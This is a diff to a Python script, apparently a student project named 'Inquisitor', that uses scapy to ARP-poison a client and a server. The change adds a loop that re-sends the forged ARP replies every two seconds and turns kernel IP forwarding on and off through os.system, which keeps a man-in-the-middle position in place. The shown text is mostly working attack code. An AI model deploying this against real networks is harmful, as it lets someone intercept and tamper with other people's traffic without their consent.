@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
-import argparse
+import os
 import sys
 import ipaddress
 import re
+import time
 from scapy.all import ARP, send
 
 class Inquisitor():
@@ -21,6 +22,18 @@ class Inquisitor():
         # Sending through the Network #
         send(poison_client, verbose=False)
         send(poison_serv, verbose=False)
+
+    def run(self):
+        print("[*] Starting port forwording")
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        try:
+            print("[*] Initalise the poison loop")
+            while True:
+                self.send_poison()
+                time.sleep(2)
+        except KeyboardInterrupt :
+            print("[*] Poison loop has been manually stopped")
+            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
     def verify_addr(self):
         pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
@@ -47,7 +60,7 @@ def main():
         return
     inquisition = Inquisitor(sys.argv)
     inquisition.verify_addr()
-    inquisition.send_poison()
+    inquisition.run()
     
 
 if (__name__ == "__main__"):
